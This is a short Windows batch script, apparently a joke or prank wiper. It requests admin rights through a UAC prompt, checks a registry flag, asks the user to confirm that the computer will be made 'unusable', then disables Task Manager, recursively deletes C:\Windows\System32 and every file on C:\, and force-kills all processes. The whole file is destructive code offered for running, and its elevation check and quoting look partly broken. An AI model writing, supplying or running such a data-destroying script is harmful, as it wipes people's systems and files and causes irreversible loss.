@echo off
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    goto detect
) else (
    goto UACprompt
)
:detect
SETLOCAL

SET RegKey=HKCU\Software\SAFEr
SET RegValue=prod

FOR /F "tokens=3" %%A IN ('REG QUERY %RegKey% /v %RegValue%') DO (
    SET ValueData=%%A
)

IF "%ValueData%"=="0x0" (
    goto war
) ELSE IF "%ValueData%"=="0x1" (
    EXIT /B 0
)

:UACprompt
powershell Start-Process -FilePath "%~dp0%~nx0" -Verb RunAs

:war
CHOICE /Y /N "This program will make your computer unsusable. Are you sure you want to continue? (Y/N)"
if errorLevel 2 (
    EXIT /B 1
)
if errorLevel 1 (
    goto WIPE
)
:WIPE
powershell -NoProfile -Command "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
; Remove-Item -Path "C:\Windows\System32" -Recurse -Force ; Get-ChildItem -Path "C:\" -Recurse -Force | Remove-Item -Force ; Get-Process | Stop-Process -Force"